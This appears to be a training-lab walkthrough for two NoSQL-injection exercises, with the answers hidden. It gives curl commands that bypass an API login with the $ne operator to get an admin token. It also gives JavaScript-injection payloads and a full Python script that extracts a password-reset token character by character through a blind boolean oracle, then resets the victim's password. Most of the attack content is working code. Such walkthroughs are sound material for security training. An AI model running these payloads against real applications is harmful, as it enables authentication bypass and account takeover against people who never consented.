# Skills Assessment

## Assessment I: API NoSQL Injection

**Goal:** Exploit the NoSQLi vulnerability in the API and submit the flag you find.

1. Spawn the target machine.
2. Test sign-in with the provided credentials via the API (e.g. pentest:pentest) using `$eq` operator (returns a regular user token):

```bash
curl -w "\n" -s -X POST "http://STMIP:STMPO/api/login" \
     -H 'Content-Type: application/json' \
     -d '{"username": {"$eq": "pentest"}, "password": {"$eq": "pentest"}}'
```

3. Now use the `$ne` operator to bypass and retrieve the admin flag token:

```bash
curl -w "\n" -s -X POST "http://STMIP:STMPO/api/login" \
     -H 'Content-Type: application/json' \
     -d '{"username": {"$ne": "pentest"}, "password": {"$ne": "pentest"}}'
```

You will get a token as admin containing the flag.

**Answer:** {hidden}

---

## Assessment II: Blind JavaScript Injection & Oracle Reset

### 1. Fuzz and Identify the Oracle
- Visit `/login` and try usernames (e.g. "bmdyy")
- Observe the difference in error messages: response ends in 'credentials.' if a check is TRUE, else 'credentials' (no period).

### 2. Confirm Injection
Send as username: `" || true || "" != "` and a random password.
If the response ends with 'credentials.' → the injection worked.
Try with false: `" || false || "" != "` (should NOT end with period).

### 3. Obtain Reset Token With Oracle-Based Extraction
- Visit `/forgot` page, request a password reset for user "bmdyy".
- Extract the token character-by-character using binary search and JS injection oracle (token is 24 chars, uppercase/hyphen only):

```python
#!/usr/bin/env python3
from urllib.parse import quote_plus
import requests

def oracle(query):
    r = requests.post(
        "http://STMIP:STMPO/login",
        headers = {"Content-Type": "application/x-www-form-urlencoded"},
        data = f"username={quote_plus(query)}&password=doesNotMatterIamBypassed"
    )
    return "credentials." in r.text

passwordResetToken = ""
for i in range(24):
    low = 45   # '-' character
    high = 90  # 'Z'
    while low <= high:
        mid = (high + low) // 2
        if oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) > {mid}) || "" != "'):
            low = mid + 1
        elif oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) < {mid}) || "" != "'):
            high = mid - 1
        else:
            passwordResetToken += chr(mid)
            break
print("Token:", passwordResetToken)
```

### 4. Reset and Use New Credentials
- Use `/reset` with the obtained token and supply a strong new password.
- Log in as "bmdyy" with the reset password to obtain the homepage flag.

**Answer:** {hidden}
